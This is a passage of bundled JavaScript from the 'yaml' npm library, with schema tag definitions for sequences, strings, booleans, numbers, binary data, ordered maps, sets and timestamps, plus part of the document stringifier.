    return typeof idx === "number" && Number.isInteger(idx) && idx >= 0 ? idx : null;
  }
  exports.YAMLSeq = YAMLSeq;
});

// node_modules/yaml/dist/schema/common/seq.js
var require_seq = __commonJS((exports) => {
  var identity = require_identity();
  var YAMLSeq = require_YAMLSeq();
  var seq = {
    collection: "seq",
    default: true,
    nodeClass: YAMLSeq.YAMLSeq,
    tag: "tag:yaml.org,2002:seq",
    resolve(seq2, onError) {
      if (!identity.isSeq(seq2))
        onError("Expected a sequence for this tag");
      return seq2;
    },
    createNode: (schema, obj, ctx) => YAMLSeq.YAMLSeq.from(schema, obj, ctx)
  };
  exports.seq = seq;
});

// node_modules/yaml/dist/schema/common/string.js
var require_string = __commonJS((exports) => {
  var stringifyString = require_stringifyString();
  var string4 = {
    identify: (value) => typeof value === "string",
    default: true,
    tag: "tag:yaml.org,2002:str",
    resolve: (str) => str,
    stringify(item, ctx, onComment, onChompKeep) {
      ctx = Object.assign({ actualString: true }, ctx);
      return stringifyString.stringifyString(item, ctx, onComment, onChompKeep);
    }
  };
  exports.string = string4;
});

// node_modules/yaml/dist/schema/common/null.js
var require_null = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var nullTag = {
    identify: (value) => value == null,
    createNode: () => new Scalar.Scalar(null),
    default: true,
    tag: "tag:yaml.org,2002:null",
    test: /^(?:~|[Nn]ull|NULL)?$/,
    resolve: () => new Scalar.Scalar(null),
    stringify: ({ source }, ctx) => typeof source === "string" && nullTag.test.test(source) ? source : ctx.options.nullStr
  };
  exports.nullTag = nullTag;
});

// node_modules/yaml/dist/schema/core/bool.js
var require_bool = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var boolTag = {
    identify: (value) => typeof value === "boolean",
    default: true,
    tag: "tag:yaml.org,2002:bool",
    test: /^(?:[Tt]rue|TRUE|[Ff]alse|FALSE)$/,
    resolve: (str) => new Scalar.Scalar(str[0] === "t" || str[0] === "T"),
    stringify({ source, value }, ctx) {
      if (source && boolTag.test.test(source)) {
        const sv = source[0] === "t" || source[0] === "T";
        if (value === sv)
          return source;
      }
      return value ? ctx.options.trueStr : ctx.options.falseStr;
    }
  };
  exports.boolTag = boolTag;
});

// node_modules/yaml/dist/stringify/stringifyNumber.js
var require_stringifyNumber = __commonJS((exports) => {
  function stringifyNumber({ format, minFractionDigits, tag, value }) {
    if (typeof value === "bigint")
      return String(value);
    const num = typeof value === "number" ? value : Number(value);
    if (!isFinite(num))
      return isNaN(num) ? ".nan" : num < 0 ? "-.inf" : ".inf";
    let n = Object.is(value, -0) ? "-0" : JSON.stringify(value);
    if (!format && minFractionDigits && (!tag || tag === "tag:yaml.org,2002:float") && /^\d/.test(n)) {
      let i = n.indexOf(".");
      if (i < 0) {
        i = n.length;
        n += ".";
      }
      let d = minFractionDigits - (n.length - i - 1);
      while (d-- > 0)
        n += "0";
    }
    return n;
  }
  exports.stringifyNumber = stringifyNumber;
});

// node_modules/yaml/dist/schema/core/float.js
var require_float = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var stringifyNumber = require_stringifyNumber();
  var floatNaN = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    test: /^(?:[-+]?\.(?:inf|Inf|INF)|\.nan|\.NaN|\.NAN)$/,
    resolve: (str) => str.slice(-3).toLowerCase() === "nan" ? NaN : str[0] === "-" ? Number.NEGATIVE_INFINITY : Number.POSITIVE_INFINITY,
    stringify: stringifyNumber.stringifyNumber
  };
  var floatExp = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    format: "EXP",
    test: /^[-+]?(?:\.[0-9]+|[0-9]+(?:\.[0-9]*)?)[eE][-+]?[0-9]+$/,
    resolve: (str) => parseFloat(str),
    stringify(node) {
      const num = Number(node.value);
      return isFinite(num) ? num.toExponential() : stringifyNumber.stringifyNumber(node);
    }
  };
  var float = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    test: /^[-+]?(?:\.[0-9]+|[0-9]+\.[0-9]*)$/,
    resolve(str) {
      const node = new Scalar.Scalar(parseFloat(str));
      const dot = str.indexOf(".");
      if (dot !== -1 && str[str.length - 1] === "0")
        node.minFractionDigits = str.length - dot - 1;
      return node;
    },
    stringify: stringifyNumber.stringifyNumber
  };
  exports.float = float;
  exports.floatExp = floatExp;
  exports.floatNaN = floatNaN;
});

// node_modules/yaml/dist/schema/core/int.js
var require_int = __commonJS((exports) => {
  var stringifyNumber = require_stringifyNumber();
  var intIdentify = (value) => typeof value === "bigint" || Number.isInteger(value);
  var intResolve = (str, offset, radix, { intAsBigInt }) => intAsBigInt ? BigInt(str) : parseInt(str.substring(offset), radix);
  function intStringify(node, radix, prefix) {
    const { value } = node;
    if (intIdentify(value) && value >= 0)
      return prefix + value.toString(radix);
    return stringifyNumber.stringifyNumber(node);
  }
  var intOct = {
    identify: (value) => intIdentify(value) && value >= 0,
    default: true,
    tag: "tag:yaml.org,2002:int",
    format: "OCT",
    test: /^0o[0-7]+$/,
    resolve: (str, _onError, opt) => intResolve(str, 2, 8, opt),
    stringify: (node) => intStringify(node, 8, "0o")
  };
  var int2 = {
    identify: intIdentify,
    default: true,
    tag: "tag:yaml.org,2002:int",
    test: /^[-+]?[0-9]+$/,
    resolve: (str, _onError, opt) => intResolve(str, 0, 10, opt),
    stringify: stringifyNumber.stringifyNumber
  };
  var intHex = {
    identify: (value) => intIdentify(value) && value >= 0,
    default: true,
    tag: "tag:yaml.org,2002:int",
    format: "HEX",
    test: /^0x[0-9a-fA-F]+$/,
    resolve: (str, _onError, opt) => intResolve(str, 2, 16, opt),
    stringify: (node) => intStringify(node, 16, "0x")
  };
  exports.int = int2;
  exports.intHex = intHex;
  exports.intOct = intOct;
});

// node_modules/yaml/dist/schema/core/schema.js
var require_schema = __commonJS((exports) => {
  var map2 = require_map();
  var _null4 = require_null();
  var seq = require_seq();
  var string4 = require_string();
  var bool = require_bool();
  var float = require_float();
  var int2 = require_int();
  var schema = [
    map2.map,
    seq.seq,
    string4.string,
    _null4.nullTag,
    bool.boolTag,
    int2.intOct,
    int2.int,
    int2.intHex,
    float.floatNaN,
    float.floatExp,
    float.float
  ];
  exports.schema = schema;
});

// node_modules/yaml/dist/schema/json/schema.js
var require_schema2 = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var map2 = require_map();
  var seq = require_seq();
  function intIdentify(value) {
    return typeof value === "bigint" || Number.isInteger(value);
  }
  var stringifyJSON = ({ value }) => JSON.stringify(value);
  var jsonScalars = [
    {
      identify: (value) => typeof value === "string",
      default: true,
      tag: "tag:yaml.org,2002:str",
      resolve: (str) => str,
      stringify: stringifyJSON
    },
    {
      identify: (value) => value == null,
      createNode: () => new Scalar.Scalar(null),
      default: true,
      tag: "tag:yaml.org,2002:null",
      test: /^null$/,
      resolve: () => null,
      stringify: stringifyJSON
    },
    {
      identify: (value) => typeof value === "boolean",
      default: true,
      tag: "tag:yaml.org,2002:bool",
      test: /^true$|^false$/,
      resolve: (str) => str === "true",
      stringify: stringifyJSON
    },
    {
      identify: intIdentify,
      default: true,
      tag: "tag:yaml.org,2002:int",
      test: /^-?(?:0|[1-9][0-9]*)$/,
      resolve: (str, _onError, { intAsBigInt }) => intAsBigInt ? BigInt(str) : parseInt(str, 10),
      stringify: ({ value }) => intIdentify(value) ? value.toString() : JSON.stringify(value)
    },
    {
      identify: (value) => typeof value === "number",
      default: true,
      tag: "tag:yaml.org,2002:float",
      test: /^-?(?:0|[1-9][0-9]*)(?:\.[0-9]*)?(?:[eE][-+]?[0-9]+)?$/,
      resolve: (str) => parseFloat(str),
      stringify: stringifyJSON
    }
  ];
  var jsonError = {
    default: true,
    tag: "",
    test: /^/,
    resolve(str, onError) {
      onError(`Unresolved plain scalar ${JSON.stringify(str)}`);
      return str;
    }
  };
  var schema = [map2.map, seq.seq].concat(jsonScalars, jsonError);
  exports.schema = schema;
});

// node_modules/yaml/dist/schema/yaml-1.1/binary.js
var require_binary = __commonJS((exports) => {
  var node_buffer = __require("buffer");
  var Scalar = require_Scalar();
  var stringifyString = require_stringifyString();
  var binary = {
    identify: (value) => value instanceof Uint8Array,
    default: false,
    tag: "tag:yaml.org,2002:binary",
    resolve(src, onError) {
      if (typeof node_buffer.Buffer === "function") {
        return node_buffer.Buffer.from(src, "base64");
      } else if (typeof atob === "function") {
        const str = atob(src.replace(/[\n\r]/g, ""));
        const buffer = new Uint8Array(str.length);
        for (let i = 0;i < str.length; ++i)
          buffer[i] = str.charCodeAt(i);
        return buffer;
      } else {
        onError("This environment does not support reading binary tags; either Buffer or atob is required");
        return src;
      }
    },
    stringify({ comment, type, value }, ctx, onComment, onChompKeep) {
      if (!value)
        return "";
      const buf = value;
      let str;
      if (typeof node_buffer.Buffer === "function") {
        str = buf instanceof node_buffer.Buffer ? buf.toString("base64") : node_buffer.Buffer.from(buf.buffer).toString("base64");
      } else if (typeof btoa === "function") {
        let s = "";
        for (let i = 0;i < buf.length; ++i)
          s += String.fromCharCode(buf[i]);
        str = btoa(s);
      } else {
        throw new Error("This environment does not support writing binary tags; either Buffer or btoa is required");
      }
      type ?? (type = Scalar.Scalar.BLOCK_LITERAL);
      if (type !== Scalar.Scalar.QUOTE_DOUBLE) {
        const lineWidth = Math.max(ctx.options.lineWidth - ctx.indent.length, ctx.options.minContentWidth);
        const n = Math.ceil(str.length / lineWidth);
        const lines = new Array(n);
        for (let i = 0, o = 0;i < n; ++i, o += lineWidth) {
          lines[i] = str.substr(o, lineWidth);
        }
        str = lines.join(type === Scalar.Scalar.BLOCK_LITERAL ? `
` : " ");
      }
      return stringifyString.stringifyString({ comment, type, value: str }, ctx, onComment, onChompKeep);
    }
  };
  exports.binary = binary;
});

// node_modules/yaml/dist/schema/yaml-1.1/pairs.js
var require_pairs = __commonJS((exports) => {
  var identity = require_identity();
  var Pair = require_Pair();
  var Scalar = require_Scalar();
  var YAMLSeq = require_YAMLSeq();
  function resolvePairs(seq, onError) {
    if (identity.isSeq(seq)) {
      for (let i = 0;i < seq.items.length; ++i) {
        let item = seq.items[i];
        if (identity.isPair(item))
          continue;
        else if (identity.isMap(item)) {
          if (item.items.length > 1)
            onError("Each pair must have its own sequence indicator");
          const pair = item.items[0] || new Pair.Pair(new Scalar.Scalar(null));
          if (item.commentBefore)
            pair.key.commentBefore = pair.key.commentBefore ? `${item.commentBefore}
${pair.key.commentBefore}` : item.commentBefore;
          if (item.comment) {
            const cn = pair.value ?? pair.key;
            cn.comment = cn.comment ? `${item.comment}
${cn.comment}` : item.comment;
          }
          item = pair;
        }
        seq.items[i] = identity.isPair(item) ? item : new Pair.Pair(item);
      }
    } else
      onError("Expected a sequence for this tag");
    return seq;
  }
  function createPairs(schema, iterable, ctx) {
    const { replacer } = ctx;
    const pairs2 = new YAMLSeq.YAMLSeq(schema);
    pairs2.tag = "tag:yaml.org,2002:pairs";
    let i = 0;
    if (iterable && Symbol.iterator in Object(iterable))
      for (let it of iterable) {
        if (typeof replacer === "function")
          it = replacer.call(iterable, String(i++), it);
        let key, value;
        if (Array.isArray(it)) {
          if (it.length === 2) {
            key = it[0];
            value = it[1];
          } else
            throw new TypeError(`Expected [key, value] tuple: ${it}`);
        } else if (it && it instanceof Object) {
          const keys = Object.keys(it);
          if (keys.length === 1) {
            key = keys[0];
            value = it[key];
          } else {
            throw new TypeError(`Expected tuple with one key, not ${keys.length} keys`);
          }
        } else {
          key = it;
        }
        pairs2.items.push(Pair.createPair(key, value, ctx));
      }
    return pairs2;
  }
  var pairs = {
    collection: "seq",
    default: false,
    tag: "tag:yaml.org,2002:pairs",
    resolve: resolvePairs,
    createNode: createPairs
  };
  exports.createPairs = createPairs;
  exports.pairs = pairs;
  exports.resolvePairs = resolvePairs;
});

// node_modules/yaml/dist/schema/yaml-1.1/omap.js
var require_omap = __commonJS((exports) => {
  var identity = require_identity();
  var toJS = require_toJS();
  var YAMLMap = require_YAMLMap();
  var YAMLSeq = require_YAMLSeq();
  var pairs = require_pairs();

  class YAMLOMap extends YAMLSeq.YAMLSeq {
    constructor() {
      super();
      this.add = YAMLMap.YAMLMap.prototype.add.bind(this);
      this.delete = YAMLMap.YAMLMap.prototype.delete.bind(this);
      this.get = YAMLMap.YAMLMap.prototype.get.bind(this);
      this.has = YAMLMap.YAMLMap.prototype.has.bind(this);
      this.set = YAMLMap.YAMLMap.prototype.set.bind(this);
      this.tag = YAMLOMap.tag;
    }
    toJSON(_, ctx) {
      if (!ctx)
        return super.toJSON(_);
      const map2 = new Map;
      if (ctx?.onCreate)
        ctx.onCreate(map2);
      for (const pair of this.items) {
        let key, value;
        if (identity.isPair(pair)) {
          key = toJS.toJS(pair.key, "", ctx);
          value = toJS.toJS(pair.value, key, ctx);
        } else {
          key = toJS.toJS(pair, "", ctx);
        }
        if (map2.has(key))
          throw new Error("Ordered maps must not include duplicate keys");
        map2.set(key, value);
      }
      return map2;
    }
    static from(schema, iterable, ctx) {
      const pairs$1 = pairs.createPairs(schema, iterable, ctx);
      const omap2 = new this;
      omap2.items = pairs$1.items;
      return omap2;
    }
  }
  YAMLOMap.tag = "tag:yaml.org,2002:omap";
  var omap = {
    collection: "seq",
    identify: (value) => value instanceof Map,
    nodeClass: YAMLOMap,
    default: false,
    tag: "tag:yaml.org,2002:omap",
    resolve(seq, onError) {
      const pairs$1 = pairs.resolvePairs(seq, onError);
      const seenKeys = [];
      for (const { key } of pairs$1.items) {
        if (identity.isScalar(key)) {
          if (seenKeys.includes(key.value)) {
            onError(`Ordered maps must not include duplicate keys: ${key.value}`);
          } else {
            seenKeys.push(key.value);
          }
        }
      }
      return Object.assign(new YAMLOMap, pairs$1);
    },
    createNode: (schema, iterable, ctx) => YAMLOMap.from(schema, iterable, ctx)
  };
  exports.YAMLOMap = YAMLOMap;
  exports.omap = omap;
});

// node_modules/yaml/dist/schema/yaml-1.1/bool.js
var require_bool2 = __commonJS((exports) => {
  var Scalar = require_Scalar();
  function boolStringify({ value, source }, ctx) {
    const boolObj = value ? trueTag : falseTag;
    if (source && boolObj.test.test(source))
      return source;
    return value ? ctx.options.trueStr : ctx.options.falseStr;
  }
  var trueTag = {
    identify: (value) => value === true,
    default: true,
    tag: "tag:yaml.org,2002:bool",
    test: /^(?:Y|y|[Yy]es|YES|[Tt]rue|TRUE|[Oo]n|ON)$/,
    resolve: () => new Scalar.Scalar(true),
    stringify: boolStringify
  };
  var falseTag = {
    identify: (value) => value === false,
    default: true,
    tag: "tag:yaml.org,2002:bool",
    test: /^(?:N|n|[Nn]o|NO|[Ff]alse|FALSE|[Oo]ff|OFF)$/,
    resolve: () => new Scalar.Scalar(false),
    stringify: boolStringify
  };
  exports.falseTag = falseTag;
  exports.trueTag = trueTag;
});

// node_modules/yaml/dist/schema/yaml-1.1/float.js
var require_float2 = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var stringifyNumber = require_stringifyNumber();
  var floatNaN = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    test: /^(?:[-+]?\.(?:inf|Inf|INF)|\.nan|\.NaN|\.NAN)$/,
    resolve: (str) => str.slice(-3).toLowerCase() === "nan" ? NaN : str[0] === "-" ? Number.NEGATIVE_INFINITY : Number.POSITIVE_INFINITY,
    stringify: stringifyNumber.stringifyNumber
  };
  var floatExp = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    format: "EXP",
    test: /^[-+]?(?:[0-9][0-9_]*)?(?:\.[0-9_]*)?[eE][-+]?[0-9]+$/,
    resolve: (str) => parseFloat(str.replace(/_/g, "")),
    stringify(node) {
      const num = Number(node.value);
      return isFinite(num) ? num.toExponential() : stringifyNumber.stringifyNumber(node);
    }
  };
  var float = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    test: /^[-+]?(?:[0-9][0-9_]*)?\.[0-9_]*$/,
    resolve(str) {
      const node = new Scalar.Scalar(parseFloat(str.replace(/_/g, "")));
      const dot = str.indexOf(".");
      if (dot !== -1) {
        const f = str.substring(dot + 1).replace(/_/g, "");
        if (f[f.length - 1] === "0")
          node.minFractionDigits = f.length;
      }
      return node;
    },
    stringify: stringifyNumber.stringifyNumber
  };
  exports.float = float;
  exports.floatExp = floatExp;
  exports.floatNaN = floatNaN;
});

// node_modules/yaml/dist/schema/yaml-1.1/int.js
var require_int2 = __commonJS((exports) => {
  var stringifyNumber = require_stringifyNumber();
  var intIdentify = (value) => typeof value === "bigint" || Number.isInteger(value);
  function intResolve(str, offset, radix, { intAsBigInt }) {
    const sign = str[0];
    if (sign === "-" || sign === "+")
      offset += 1;
    str = str.substring(offset).replace(/_/g, "");
    if (intAsBigInt) {
      switch (radix) {
        case 2:
          str = `0b${str}`;
          break;
        case 8:
          str = `0o${str}`;
          break;
        case 16:
          str = `0x${str}`;
          break;
      }
      const n2 = BigInt(str);
      return sign === "-" ? BigInt(-1) * n2 : n2;
    }
    const n = parseInt(str, radix);
    return sign === "-" ? -1 * n : n;
  }
  function intStringify(node, radix, prefix) {
    const { value } = node;
    if (intIdentify(value)) {
      const str = value.toString(radix);
      return value < 0 ? "-" + prefix + str.substr(1) : prefix + str;
    }
    return stringifyNumber.stringifyNumber(node);
  }
  var intBin = {
    identify: intIdentify,
    default: true,
    tag: "tag:yaml.org,2002:int",
    format: "BIN",
    test: /^[-+]?0b[0-1_]+$/,
    resolve: (str, _onError, opt) => intResolve(str, 2, 2, opt),
    stringify: (node) => intStringify(node, 2, "0b")
  };
  var intOct = {
    identify: intIdentify,
    default: true,
    tag: "tag:yaml.org,2002:int",
    format: "OCT",
    test: /^[-+]?0[0-7_]+$/,
    resolve: (str, _onError, opt) => intResolve(str, 1, 8, opt),
    stringify: (node) => intStringify(node, 8, "0")
  };
  var int2 = {
    identify: intIdentify,
    default: true,
    tag: "tag:yaml.org,2002:int",
    test: /^[-+]?[0-9][0-9_]*$/,
    resolve: (str, _onError, opt) => intResolve(str, 0, 10, opt),
    stringify: stringifyNumber.stringifyNumber
  };
  var intHex = {
    identify: intIdentify,
    default: true,
    tag: "tag:yaml.org,2002:int",
    format: "HEX",
    test: /^[-+]?0x[0-9a-fA-F_]+$/,
    resolve: (str, _onError, opt) => intResolve(str, 2, 16, opt),
    stringify: (node) => intStringify(node, 16, "0x")
  };
  exports.int = int2;
  exports.intBin = intBin;
  exports.intHex = intHex;
  exports.intOct = intOct;
});

// node_modules/yaml/dist/schema/yaml-1.1/set.js
var require_set = __commonJS((exports) => {
  var identity = require_identity();
  var Pair = require_Pair();
  var YAMLMap = require_YAMLMap();

  class YAMLSet extends YAMLMap.YAMLMap {
    constructor(schema) {
      super(schema);
      this.tag = YAMLSet.tag;
    }
    add(key) {
      let pair;
      if (identity.isPair(key))
        pair = key;
      else if (key && typeof key === "object" && "key" in key && "value" in key && key.value === null)
        pair = new Pair.Pair(key.key, null);
      else
        pair = new Pair.Pair(key, null);
      const prev = YAMLMap.findPair(this.items, pair.key);
      if (!prev)
        this.items.push(pair);
    }
    get(key, keepPair) {
      const pair = YAMLMap.findPair(this.items, key);
      return !keepPair && identity.isPair(pair) ? identity.isScalar(pair.key) ? pair.key.value : pair.key : pair;
    }
    set(key, value) {
      if (typeof value !== "boolean")
        throw new Error(`Expected boolean value for set(key, value) in a YAML set, not ${typeof value}`);
      const prev = YAMLMap.findPair(this.items, key);
      if (prev && !value) {
        this.items.splice(this.items.indexOf(prev), 1);
      } else if (!prev && value) {
        this.items.push(new Pair.Pair(key));
      }
    }
    toJSON(_, ctx) {
      return super.toJSON(_, ctx, Set);
    }
    toString(ctx, onComment, onChompKeep) {
      if (!ctx)
        return JSON.stringify(this);
      if (this.hasAllNullValues(true))
        return super.toString(Object.assign({}, ctx, { allNullValues: true }), onComment, onChompKeep);
      else
        throw new Error("Set items must all have null values");
    }
    static from(schema, iterable, ctx) {
      const { replacer } = ctx;
      const set3 = new this(schema);
      if (iterable && Symbol.iterator in Object(iterable))
        for (let value of iterable) {
          if (typeof replacer === "function")
            value = replacer.call(iterable, value, value);
          set3.items.push(Pair.createPair(value, null, ctx));
        }
      return set3;
    }
  }
  YAMLSet.tag = "tag:yaml.org,2002:set";
  var set2 = {
    collection: "map",
    identify: (value) => value instanceof Set,
    nodeClass: YAMLSet,
    default: false,
    tag: "tag:yaml.org,2002:set",
    createNode: (schema, iterable, ctx) => YAMLSet.from(schema, iterable, ctx),
    resolve(map2, onError) {
      if (identity.isMap(map2)) {
        if (map2.hasAllNullValues(true))
          return Object.assign(new YAMLSet, map2);
        else
          onError("Set items must all have null values");
      } else
        onError("Expected a mapping for this tag");
      return map2;
    }
  };
  exports.YAMLSet = YAMLSet;
  exports.set = set2;
});

// node_modules/yaml/dist/schema/yaml-1.1/timestamp.js
var require_timestamp = __commonJS((exports) => {
  var stringifyNumber = require_stringifyNumber();
  function parseSexagesimal(str, asBigInt) {
    const sign = str[0];
    const parts = sign === "-" || sign === "+" ? str.substring(1) : str;
    const num = (n) => asBigInt ? BigInt(n) : Number(n);
    const res = parts.replace(/_/g, "").split(":").reduce((res2, p) => res2 * num(60) + num(p), num(0));
    return sign === "-" ? num(-1) * res : res;
  }
  function stringifySexagesimal(node) {
    let { value } = node;
    let num = (n) => n;
    if (typeof value === "bigint")
      num = (n) => BigInt(n);
    else if (isNaN(value) || !isFinite(value))
      return stringifyNumber.stringifyNumber(node);
    let sign = "";
    if (value < 0) {
      sign = "-";
      value *= num(-1);
    }
    const _60 = num(60);
    const parts = [value % _60];
    if (value < 60) {
      parts.unshift(0);
    } else {
      value = (value - parts[0]) / _60;
      parts.unshift(value % _60);
      if (value >= 60) {
        value = (value - parts[0]) / _60;
        parts.unshift(value);
      }
    }
    return sign + parts.map((n) => String(n).padStart(2, "0")).join(":").replace(/000000\d*$/, "");
  }
  var intTime = {
    identify: (value) => typeof value === "bigint" || Number.isInteger(value),
    default: true,
    tag: "tag:yaml.org,2002:int",
    format: "TIME",
    test: /^[-+]?[0-9][0-9_]*(?::[0-5]?[0-9])+$/,
    resolve: (str, _onError, { intAsBigInt }) => parseSexagesimal(str, intAsBigInt),
    stringify: stringifySexagesimal
  };
  var floatTime = {
    identify: (value) => typeof value === "number",
    default: true,
    tag: "tag:yaml.org,2002:float",
    format: "TIME",
    test: /^[-+]?[0-9][0-9_]*(?::[0-5]?[0-9])+\.[0-9_]*$/,
    resolve: (str) => parseSexagesimal(str, false),
    stringify: stringifySexagesimal
  };
  var timestamp = {
    identify: (value) => value instanceof Date,
    default: true,
    tag: "tag:yaml.org,2002:timestamp",
    test: RegExp("^([0-9]{4})-([0-9]{1,2})-([0-9]{1,2})" + "(?:" + "(?:t|T|[ \\t]+)" + "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}(\\.[0-9]+)?)" + "(?:[ \\t]*(Z|[-+][012]?[0-9](?::[0-9]{2})?))?" + ")?$"),
    resolve(str) {
      const match = str.match(timestamp.test);
      if (!match)
        throw new Error("!!timestamp expects a date, starting with yyyy-mm-dd");
      const [, year, month, day, hour, minute, second] = match.map(Number);
      const millisec = match[7] ? Number((match[7] + "00").substr(1, 3)) : 0;
      let date5 = Date.UTC(year, month - 1, day, hour || 0, minute || 0, second || 0, millisec);
      const tz = match[8];
      if (tz && tz !== "Z") {
        let d = parseSexagesimal(tz, false);
        if (Math.abs(d) < 30)
          d *= 60;
        date5 -= 60000 * d;
      }
      return new Date(date5);
    },
    stringify: ({ value }) => value?.toISOString().replace(/(T00:00:00)?\.000Z$/, "") ?? ""
  };
  exports.floatTime = floatTime;
  exports.intTime = intTime;
  exports.timestamp = timestamp;
});

// node_modules/yaml/dist/schema/yaml-1.1/schema.js
var require_schema3 = __commonJS((exports) => {
  var map2 = require_map();
  var _null4 = require_null();
  var seq = require_seq();
  var string4 = require_string();
  var binary = require_binary();
  var bool = require_bool2();
  var float = require_float2();
  var int2 = require_int2();
  var merge2 = require_merge();
  var omap = require_omap();
  var pairs = require_pairs();
  var set2 = require_set();
  var timestamp = require_timestamp();
  var schema = [
    map2.map,
    seq.seq,
    string4.string,
    _null4.nullTag,
    bool.trueTag,
    bool.falseTag,
    int2.intBin,
    int2.intOct,
    int2.int,
    int2.intHex,
    float.floatNaN,
    float.floatExp,
    float.float,
    binary.binary,
    merge2.merge,
    omap.omap,
    pairs.pairs,
    set2.set,
    timestamp.intTime,
    timestamp.floatTime,
    timestamp.timestamp
  ];
  exports.schema = schema;
});

// node_modules/yaml/dist/schema/tags.js
var require_tags = __commonJS((exports) => {
  var map2 = require_map();
  var _null4 = require_null();
  var seq = require_seq();
  var string4 = require_string();
  var bool = require_bool();
  var float = require_float();
  var int2 = require_int();
  var schema = require_schema();
  var schema$1 = require_schema2();
  var binary = require_binary();
  var merge2 = require_merge();
  var omap = require_omap();
  var pairs = require_pairs();
  var schema$2 = require_schema3();
  var set2 = require_set();
  var timestamp = require_timestamp();
  var schemas3 = new Map([
    ["core", schema.schema],
    ["failsafe", [map2.map, seq.seq, string4.string]],
    ["json", schema$1.schema],
    ["yaml11", schema$2.schema],
    ["yaml-1.1", schema$2.schema]
  ]);
  var tagsByName = {
    binary: binary.binary,
    bool: bool.boolTag,
    float: float.float,
    floatExp: float.floatExp,
    floatNaN: float.floatNaN,
    floatTime: timestamp.floatTime,
    int: int2.int,
    intHex: int2.intHex,
    intOct: int2.intOct,
    intTime: timestamp.intTime,
    map: map2.map,
    merge: merge2.merge,
    null: _null4.nullTag,
    omap: omap.omap,
    pairs: pairs.pairs,
    seq: seq.seq,
    set: set2.set,
    timestamp: timestamp.timestamp
  };
  var coreKnownTags = {
    "tag:yaml.org,2002:binary": binary.binary,
    "tag:yaml.org,2002:merge": merge2.merge,
    "tag:yaml.org,2002:omap": omap.omap,
    "tag:yaml.org,2002:pairs": pairs.pairs,
    "tag:yaml.org,2002:set": set2.set,
    "tag:yaml.org,2002:timestamp": timestamp.timestamp
  };
  function getTags(customTags, schemaName, addMergeTag) {
    const schemaTags = schemas3.get(schemaName);
    if (schemaTags && !customTags) {
      return addMergeTag && !schemaTags.includes(merge2.merge) ? schemaTags.concat(merge2.merge) : schemaTags.slice();
    }
    let tags = schemaTags;
    if (!tags) {
      if (Array.isArray(customTags))
        tags = [];
      else {
        const keys = Array.from(schemas3.keys()).filter((key) => key !== "yaml11").map((key) => JSON.stringify(key)).join(", ");
        throw new Error(`Unknown schema "${schemaName}"; use one of ${keys} or define customTags array`);
      }
    }
    if (Array.isArray(customTags)) {
      for (const tag of customTags)
        tags = tags.concat(tag);
    } else if (typeof customTags === "function") {
      tags = customTags(tags.slice());
    }
    if (addMergeTag)
      tags = tags.concat(merge2.merge);
    return tags.reduce((tags2, tag) => {
      const tagObj = typeof tag === "string" ? tagsByName[tag] : tag;
      if (!tagObj) {
        const tagName = JSON.stringify(tag);
        const keys = Object.keys(tagsByName).map((key) => JSON.stringify(key)).join(", ");
        throw new Error(`Unknown custom tag ${tagName}; use one of ${keys}`);
      }
      if (!tags2.includes(tagObj))
        tags2.push(tagObj);
      return tags2;
    }, []);
  }
  exports.coreKnownTags = coreKnownTags;
  exports.getTags = getTags;
});

// node_modules/yaml/dist/schema/Schema.js
var require_Schema = __commonJS((exports) => {
  var identity = require_identity();
  var map2 = require_map();
  var seq = require_seq();
  var string4 = require_string();
  var tags = require_tags();
  var sortMapEntriesByKey = (a, b) => a.key < b.key ? -1 : a.key > b.key ? 1 : 0;

  class Schema {
    constructor({ compat: compat2, customTags, merge: merge2, resolveKnownTags, schema, sortMapEntries, toStringDefaults }) {
      this.compat = Array.isArray(compat2) ? tags.getTags(compat2, "compat") : compat2 ? tags.getTags(null, compat2) : null;
      this.name = typeof schema === "string" && schema || "core";
      this.knownTags = resolveKnownTags ? tags.coreKnownTags : {};
      this.tags = tags.getTags(customTags, this.name, merge2);
      this.toStringOptions = toStringDefaults ?? null;
      Object.defineProperty(this, identity.MAP, { value: map2.map });
      Object.defineProperty(this, identity.SCALAR, { value: string4.string });
      Object.defineProperty(this, identity.SEQ, { value: seq.seq });
      this.sortMapEntries = typeof sortMapEntries === "function" ? sortMapEntries : sortMapEntries === true ? sortMapEntriesByKey : null;
    }
    clone() {
      const copy = Object.create(Schema.prototype, Object.getOwnPropertyDescriptors(this));
      copy.tags = this.tags.slice();
      return copy;
    }
  }
  exports.Schema = Schema;
});

// node_modules/yaml/dist/stringify/stringifyDocument.js
var require_stringifyDocument = __commonJS((exports) => {
  var identity = require_identity();
  var stringify = require_stringify();
  var stringifyComment = require_stringifyComment();
  function stringifyDocument(doc2, options) {
    const lines = [];
    let hasDirectives = options.directives === true;
    if (options.directives !== false && doc2.directives) {
      const dir = doc2.directives.toString(doc2);
      if (dir) {
        lines.push(dir);
        hasDirectives = true;
      } else if (doc2.directives.docStart)
        hasDirectives = true;
    }
    if (hasDirectives)
      lines.push("---");
    const ctx = stringify.createStringifyContext(doc2, options);
    const { commentString } = ctx.options;
    if (doc2.commentBefore) {
      if (lines.length !== 1)
        lines.unshift("");
      const cs = commentString(doc2.commentBefore);
      lines.unshift(stringifyComment.indentComment(cs, ""));
    }
    let chompKeep = false;
    let contentComment = null;
    if (doc2.contents) {
      if (identity.isNode(doc2.contents)) {
        if (doc2.contents.spaceBefore && hasDirectives)
          lines.push("");
        if (doc2.contents.commentBefore) {
          const cs = commentString(doc2.contents.commentBefore);
          lines.push(stringifyComment.indentComment(cs, ""));
        }
        ctx.forceBlockIndent = !!doc2.comment;
        contentComment = doc2.contents.comment;
      }
      const onChompKeep = contentComment ? undefined : () => chompKeep = true;
      let body = stringify.stringify(doc2.contents, ctx, () => contentComment = null, onChompKeep);
      if (contentComment)
        body += stringifyComment.lineComment(body, "", commentString(contentComment));
